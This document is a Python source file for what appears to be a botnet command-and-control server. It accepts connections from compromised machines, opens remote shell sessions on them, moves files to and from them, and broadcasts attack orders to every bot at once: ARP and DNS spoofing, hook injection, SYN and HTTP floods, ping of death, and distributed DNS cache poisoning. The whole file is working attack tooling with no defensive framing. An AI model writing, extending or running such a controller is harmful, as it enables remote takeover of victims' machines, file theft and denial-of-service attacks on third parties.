#!/usr/bin/env python

import socket
import json
import base64
import select
import multiprocessing
from time import sleep


def help_message():
    print("------------------------------------------------------------------------------------")
    print("COMMANDS                                 DESCRIPTION")
    print("------------------------------------------------------------------------------------")
    print("help                                     Show commands")
    print("exit                                     Exit the Center")
    print("connections                              Show connected devices")
    print("session <number>                         Open terminal of specific device")
    print("sendall <command>                        Broadcast command to all connected devices")
    print("--arpspoof                               Auto scan & arp spoof")
    print("--dnsspoof <target-url> <spoofed-ip>     DNS spoof attack")
    print("--hook                                   Hook injector")
    print("--synflood <target-ip> <ports> <times>   SYN flood attack")
    print("--httpflood <target-ip> <times>          HTTP flood attack")
    print("--pod <target-ip> <times>                Ping of death attack")
    print("--dnscachepoison <target-url>\n"
          "  <nameserver> <auth-ip> <rec-ip>\n"
          "  <spoof-url> <ports>                    DNS cache poisoning")
    print("--killarp                                Kill process running arp spoof")
    print("--killdns                                Kill process running dns spoof")
    print("--killhook                               Kill process running hook injector")
    print("------------------------------------------------------------------------------------")


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Download successful."


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        manager = multiprocessing.Manager()
        self.addresses = manager.list()
        self.connections = manager.list()
        self.num = 0
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.ip, self.port))
        self.listener.listen(0)

    def server(self):
        print("[+] Waiting for incoming connections..")
        while True:
            self.listener.settimeout(1)
            try:
                connection, address = self.listener.accept()
                self.connections.append(connection)
                self.addresses.append(address)
                print("[+] Got a connection from {}".format(str(address)))
            except:
                pass

    def check_connections(self):
        while True:
            sleep(15)
            j = 0
            deletion = set()
            for i, connection in enumerate(self.connections):
                ready = select.select([self.connections[i]], [], [], 0.1)
                self.reliable_send(["PING"], i)
                self.connections[i].recv(1024)
                if not ready[0]:
                    pass
                else:
                    connection.close()
                    deletion.add(i)
            for i in deletion:
                del self.connections[i - j]
                del self.addresses[i - j]
                j += 1

    def reliable_send(self, data, i):
        json_data = json.dumps(data).encode('utf-8')
        try:
            self.connections[i].send(json_data)
        except BrokenPipeError:
            print("[!] Broken Pipe.")

    def reliable_receive(self, i):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connections[i].recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:
                continue

    def execute_remotely(self, command, i):
        self.reliable_send(command, i)
        return self.reliable_receive(i)

    def shell(self):
        while True:
            sleep(0.1)
            command = input("Center: ")
            command = command.split(" ")

            if command[0] == "exit":
                json_data = json.dumps(["killconnection"]).encode('utf-8')
                for connection in self.connections:
                    try:
                        connection.send(json_data)
                        connection.close()
                    except:
                        print("[!] One connection not found.")
                self.listener.close()
                break

            elif command[0] == "help":
                help_message()

            elif command[0] == "connections":
                for i, address in enumerate(self.addresses):
                    print("{}. {}".format(str(i), str(address)))

            elif command[0] == "session":
                try:
                    self.num = int(command[1])
                    self.session()
                except:
                    print("[!] Connection not found.")

            elif command[0] == "sendall":
                if command[1] == "dnscachepoison":
                    step = 65535 // len(self.connections)
                    i = 0
                    for connection in self.connections:
                        new_command = command[:]
                        new_command.append(str(i))
                        new_command.append(str(i + step))
                        i = i + step + 1
                        json_data = json.dumps(new_command[1:]).encode('utf-8')
                        try:
                            connection.send(json_data)
                        except:
                            print("[!] One connection not found.")
                else:
                    json_data = json.dumps(command[1:]).encode('utf-8')
                    for connection in self.connections:
                        try:
                            connection.send(json_data)
                        except:
                            print("[!] One connection not found.")

            else:
                print("[-] Command does not exist.")

    def session(self):
        while True:
            command = input("Shell:~{}# ".format(str(self.addresses[self.num])))
            command = command.split(" ")

            if command[0] != "killconnection":
                try:
                    if command[0] == "upload":
                        file_content = read_file(command[1])
                        command.append(file_content.decode('utf-8'))

                    result = self.execute_remotely(command, self.num)

                    if command[0] == "exit":
                        break

                    elif command[0] == "download" and "[-] Error " not in result:
                        result = write_file(command[1], result)
                except:
                    result = "[-] Error during command execution."
                print(result)
            else:
                print("[-] Not valid option!")
